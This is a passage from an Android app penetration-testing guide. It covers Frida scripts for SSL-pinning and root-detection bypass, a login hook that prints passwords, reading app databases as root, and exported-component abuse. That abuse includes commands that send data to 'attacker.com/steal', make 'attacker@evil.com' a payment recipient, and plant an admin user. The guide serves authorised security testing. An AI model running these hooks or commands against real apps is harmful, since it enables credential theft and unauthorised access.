# Run Frida script
frida -U -f com.example.targetapp -l ssl-bypass.js --no-pause

# Expected Output:
# [*] Starting SSL Bypass
# [*] SSL Pinning Bypass Complete

# Check Burp Suite - HTTPS traffic should now be visible
```

**Verify Bypass:**
```bash
# Traffic should now appear in Burp Suite > HTTP history
# You should see HTTPS requests and responses clearly
```

---

**Step 4: Inspect Data Storage**

**A. SharedPreferences:**
```bash
# Navigate to app data directory
adb shell
su
cd /data/data/com.example.targetapp/shared_prefs/

# List preference files
ls -la

# Expected Output:
# -rw-rw---- u0_aXXX u0_aXXX 2048 2024-01-15 10:30 com.example.targetapp_preferences.xml
# -rw-rw---- u0_aXXX u0_aXXX 1024 2024-01-15 10:30 user_prefs.xml

# Read each file
cat *.xml

# Look for:
# - Plain text passwords
# - Auth tokens
# - Session IDs
# - Personal information
# - API keys
```

**B. SQLite Databases:**
```bash
# Still in adb shell as root
cd /data/data/com.example.targetapp/databases/

# List databases
ls -la

# Expected Output:
# -rw-rw---- u0_aXXX u0_aXXX 24576 2024-01-15 10:30 userdata.db
# -rw-rw---- u0_aXXX u0_aXXX 32768 2024-01-15 10:30 app_database.db

# Open database with sqlite3
sqlite3 userdata.db

# In sqlite3:
.tables
# Lists all tables

.schema users
# Shows table structure

SELECT * FROM users;
# View all user data

SELECT * FROM credentials;
SELECT * FROM sessions;
SELECT * FROM payments;

# Look for sensitive data
.quit

exit
```

**Pull Database for Analysis:**
```bash
# Exit from device shell first
exit

# Pull database to local machine
adb pull /data/data/com.example.targetapp/databases/userdata.db ./

# Open with SQLite browser (GUI tool)
# Or analyze with sqlite3 locally:
sqlite3 userdata.db

SELECT name FROM sqlite_master WHERE type='table';
# List all tables

# Query each table
SELECT * FROM users LIMIT 10;
```

**C. Files in Internal Storage:**
```bash
adb shell
su
cd /data/data/com.example.targetapp/

# List all directories
ls -la

# Common directories:
# - cache/     : Temporary files
# - files/     : App files
# - databases/ : Databases
# - shared_prefs/ : Preferences
# - code_cache/ : Compiled code

# Check files directory
cd files/
ls -la

# Look for:
cat config.json
cat credentials.txt
cat *.log
cat *.tmp

# Check cache
cd ../cache/
ls -la
cat *
```

**D. External Storage (SD Card):**
```bash
adb shell
# No root needed for external storage

cd /sdcard/Android/data/com.example.targetapp/

# List contents
ls -la

# Check for sensitive files
find . -type f -name "*.txt" -o -name "*.log" -o -name "*.db"

# Read suspicious files
cat files/backup.txt
cat files/user_data.json
```

---

**Step 5: Runtime Manipulation with Frida**

**List Running Processes:**
```bash
# List all processes
frida-ps -U

# Filter for target app
frida-ps -U | grep targetapp
```

**Attach to Running App:**
```bash
# Method 1: Attach to running process
frida -U com.example.targetapp

# Method 2: Spawn and attach
frida -U -f com.example.targetapp --no-pause
```

**Interactive Frida Console:**
```bash
# Start interactive session
frida -U com.example.targetapp

# In Frida console:
Java.perform(function() {
    console.log("Frida is ready!");
});
```

**Example: Hook Login Function:**

Create file: `hook-login.js`
```javascript
// hook-login.js
Java.perform(function() {
    console.log("[*] Hooking login function");
    
    // Find LoginActivity class
    var LoginActivity = Java.use('com.example.targetapp.LoginActivity');
    
    // Hook login method
    LoginActivity.performLogin.overload('java.lang.String', 'java.lang.String').implementation = function(username, password) {
        console.log("[+] Login called!");
        console.log("[+] Username: " + username);
        console.log("[+] Password: " + password);
        
        // Call original method
        var result = this.performLogin(username, password);
        
        console.log("[+] Login result: " + result);
        return result;
    };
    
    console.log("[*] Login hook installed");
});
```

```bash
# Run the hook
frida -U -f com.example.targetapp -l hook-login.js --no-pause

# Now use the app and login
# Credentials will be printed in console
```

**Example: Bypass Root Detection:**

Create file: `bypass-root.js`
```javascript
// bypass-root.js
Java.perform(function() {
    console.log("[*] Bypassing root detection");
    
    // Hook common root check methods
    var RootChecker = Java.use('com.example.targetapp.RootChecker');
    
    RootChecker.isDeviceRooted.implementation = function() {
        console.log("[+] Root check bypassed - returning false");
        return false; // Device is not rooted
    };
    
    // Hook file existence checks
    var File = Java.use('java.io.File');
    File.exists.implementation = function() {
        var path = this.getAbsolutePath();
        
        // Block checks for su binary and other root indicators
        if (path.indexOf("su") !== -1 || 
            path.indexOf("magisk") !== -1 ||
            path.indexOf("supersu") !== -1) {
            console.log("[+] Blocking file check: " + path);
            return false;
        }
        
        return this.exists();
    };
    
    console.log("[*] Root detection bypass complete");
});
```

```bash
# Run bypass
frida -U -f com.example.targetapp -l bypass-root.js --no-pause

# App should now run on rooted device
```

**Example: Dump Memory Strings:**
```bash
# Create dump-memory.js
nano dump-memory.js
```

```javascript
// dump-memory.js
Java.perform(function() {
    console.log("[*] Dumping memory strings");
    
    Java.enumerateLoadedClasses({
        onMatch: function(className) {
            if (className.indexOf('com.example.targetapp') !== -1) {
                console.log("[+] Found class: " + className);
                
                try {
                    var cls = Java.use(className);
                    var fields = cls.class.getDeclaredFields();
                    
                    fields.forEach(function(field) {
                        field.setAccessible(true);
                        console.log("  Field: " + field.getName());
                    });
                } catch(e) {
                    // Ignore errors
                }
            }
        },
        onComplete: function() {
            console.log("[*] Enumeration complete");
        }
    });
});
```

```bash
frida -U com.example.targetapp -l dump-memory.js
```

---

**Step 6: Test Exported Components**

**List Exported Activities:**
```bash
# Get all exported components
adb shell dumpsys package com.example.targetapp | grep -A 5 "Activity"

# Or use Drozer
drozer console connect
dz> run app.package.attacksurface com.example.targetapp
```

**Test Activity Launch:**
```bash
# Try launching exported activities directly
adb shell am start -n com.example.targetapp/.AdminActivity

# Expected: Activity should launch without authentication (vulnerability)

# Test with data
adb shell am start -n com.example.targetapp/.PaymentActivity \
  --es "amount" "1" \
  --es "recipient" "attacker@evil.com"
```

**Test Exported Services:**
```bash
# Start service
adb shell am startservice -n com.example.targetapp/.BackgroundService

# With data
adb shell am startservice -n com.example.targetapp/.DataSyncService \
  --es "sync_url" "http://attacker.com/steal"
```

**Test Broadcast Receivers:**
```bash
# Send broadcast
adb shell am broadcast -a com.example.targetapp.CUSTOM_ACTION

# With data
adb shell am broadcast -a com.example.targetapp.PAYMENT_SUCCESS \
  --es "transaction_id" "fake123" \
  --es "amount" "9999"
```

**Test Content Providers:**
```bash
# Query content provider
adb shell content query --uri content://com.example.targetapp.provider/users

# Insert data
adb shell content insert --uri content://com.example.targetapp.provider/users \
  --bind username:s:"hacker" \
  --bind role:s:"admin"

# Update data
adb shell content update --uri content://com.example.targetapp.provider/users/1 \
  --bind password:s:"hacked123"

# Delete data
adb shell content delete --uri content://com.example.targetapp.provider/users/1
```

---

**Step 7: Document Dynamic Analysis Findings**

Create findings document:
```
Dynamic Analysis Findings:

[ ] Logging Issues
    - Sensitive data in logs: Yes/No
    - Details: [list what was found]
    - Screenshots: [attach]

[ ] Network Traffic
    - HTTP used: Yes/No
    - Credentials over HTTP: Yes/No
    - SSL Pinning: Implemented/Not implemented
    - SSL Pinning bypassed: Yes/No
    - Sensitive data in requests: [list]

[ ] Data Storage
    - SharedPreferences encrypted: Yes/No
    - Sensitive data in SharedPreferences: [list]
    - Database encrypted: Yes/No
    - Sensitive data in database: [list]
    - Files on SD card: [list]

[ ] Runtime Security
    - Root detection: Present/Absent
    - Root detection bypassed: Yes/No
    - Debugger detection: Present/Absent

[ ] Component Security
    - Exported activities accessible: Yes/No
    - Vulnerable components: [list]
    - Component exploitation successful: Yes/No

[ ] API Security
    - Authentication bypass: Possible/Not possible
    - Authorization issues: Found/Not found
    - IDOR vulnerabilities: Found/Not found
```

---

## 📋 SECTION 7: Complete Testing Workflow {#testing-workflow}

### 7.1 Day 1: Setup & Static Analysis (4-6 hours)

```
09:00 - 09:30 : Environment Setup
                - Install all tools
                - Configure emulator
                - Test connections

09:30 - 10:00 : Obtain & Prepare APK
                - Pull APK from device
                - Create working directory
                - Organize files

10:00 - 11:00 : Initial Reconnaissance
                - Decompile with APKTool
                - Decompile with JADX
                - Run MobSF scan
                - Take notes

11:00 - 12:00 : AndroidManifest Analysis
                - Check all security flags
                - List exported components
                - Document permissions
                - Identify deep links

12:00 - 13:00 : Lunch Break

13:00 - 14:30 : Code Review - Security Issues
                - Search for hardcoded secrets
                - Check logging practices
                - Review crypto usage
                - Check data storage

14:30 - 16:00 : Code Review - Business Logic
                - Authentication logic
                - Authorization checks
                - Payment/transaction logic
                - API endpoints

16:00 - 17:00 : Document Static Findings
                - Create findings list
                - Take screenshots
                - Rate severity
                - Prepare for dynamic testing
```

---

### 7.2 Day 2: Dynamic Analysis (6-8 hours)

```
09:00 - 09:30 : Dynamic Setup
                - Start emulator
                - Start Frida server
                - Configure proxy
                - Verify all connections

09:30 - 10:30 : Logging Analysis
                - Clear logcat
                - Use app fully
                - Monitor logs
                - Search for sensitive data

10:30 - 12:00 : Network Traffic Analysis
                - Enable Burp intercept
                - Test all app features
                - Analyze HTTP history
                - Test authentication/authorization
                - Check for HTTPS issues

12:00 - 13:00 : Lunch Break

13:00 - 14:00 : SSL Pinning (if present)
                - Identify pinning
                - Bypass with Frida
                - Re-test traffic interception

14:00 - 15:30 : Data Storage Analysis
                - Check SharedPreferences
                - Analyze databases
                - Check file storage
                - Check SD card

15:30 - 17:00 : Runtime Manipulation
                - Write Frida hooks
                - Bypass security checks
                - Test authentication bypass
                - Test authorization bypass

17:00 - 18:00 : Component Testing
                - Test exported activities
                - Test exported services
                - Test content providers
                - Test broadcast receivers
```

---

### 7.3 Day 3: Advanced Testing & Reporting (4-6 hours)

```
09:00 - 10:30 : API Security Testing
                - Test injection attacks
                - Test IDOR
                - Test rate limiting
                - Test business logic flaws

10:30 - 12:00 : Exploitation & PoC
                - Create proof of concepts
                - Take screenshots/videos
                - Document exploitation steps

12:00 - 13:00 : Lunch Break

13:00 - 15:00 : Report Writing
                - Compile all findings
                - Organize by severity
                - Write descriptions
                - Add screenshots

15:00 - 16:00 : Review & Quality Check
                - Re-test critical findings
                - Verify all PoCs work
                - Proofread report

16:00 - 17:00 : Final Delivery
                - Generate final report
                - Prepare presentation
                - Submit deliverables
```

---

### 7.4 Quick Reference Checklist

**Before Starting:**
```
[ ] All tools installed and working
[ ] Emulator/device connected (adb devices)
[ ] Root access verified (adb shell su)
[ ] Frida server running (frida-ps -U)
[ ] Proxy configured and tested
[ ] Burp certificate installed
[ ] Working directory created
[ ] APK obtained
```

**Static Analysis Checklist:**
```
[ ] APK decompiled (APKTool + JADX)
[ ] AndroidManifest.xml analyzed
[ ] Hardcoded secrets searched
[ ] Code security reviewed
[ ] Data storage methods checked
[ ] Network security reviewed
[ ] Crypto implementations checked
[ ] Findings documented
```

**Dynamic Analysis Checklist:**
```
[ ] Logcat monitored
[ ] Network traffic intercepted
[ ] SSL pinning bypassed (if needed)
[ ] SharedPreferences checked
[ ] Databases analyzed
[ ] File storage reviewed
[ ] Runtime hooks created
[ ] Components tested
[ ] Findings documented
```

**Final Checklist:**
```
[ ] All findings severity rated
[ ] Screenshots/videos captured
[ ] PoCs documented
[ ] Report written
[ ] Quality check completed
[ ] Deliverables prepared
```

---

## 🎯 Quick Command Reference

**Device Connection:**
```bash
adb devices                                    # List devices
adb root                                       # Restart as root
adb remount                                    # Remount system
adb shell                                      # Open shell
```

**App Management:**
```bash
adb install app.apk                            # Install
adb uninstall com.package.name                 # Uninstall
adb shell pm list packages | grep keyword      # Find package
adb shell pm path com.package.name             # Get APK path
adb pull /path/to/base.apk ./app.apk          # Pull APK
```

**Decompilation:**
```bash
apktool d app.apk -o output                    # Decompile
jadx-gui app.apk                               # Open in JADX GUI
jadx app.apk -d output                         # JADX command line
```

**Proxy & Network:**
```bash
adb shell settings put global http_proxy IP:8080   # Set proxy
adb shell settings get global http_proxy           # Check proxy
adb shell settings put global http_proxy :0        # Remove proxy
```

**Frida:**
```bash
frida-ps -U                                     # List processes
frida -U com.package.name                       # Attach to app
frida -U -f com.package.name --no-pause         # Spawn and attach
frida -U -f com.package.name -l script.js       # Run script
objection -g com.package.name explore           # Objection
```

**Data Access:**
```bash
adb shell su -c "ls -la /data/data/PKG/"                    # List app data
adb shell su -c "cat /data/data/PKG/shared_prefs/*.xml"     # Read prefs
adb pull /data/data/PKG/databases/db.db ./                  # Pull database
```

**Component Testing:**
```bash
adb shell am start -n PKG/.Activity             # Start activity
adb shell am startservice -n PKG/.Service       # Start service
adb shell am broadcast -a ACTION                # Send broadcast
adb shell content query --uri content://URI     # Query provider
```

---

**END OF GUIDE**

This guide covers the complete workflow from tool installation to dynamic analysis. Follow the day-by-day plan for systematic testing, and use the quick reference section for common commands.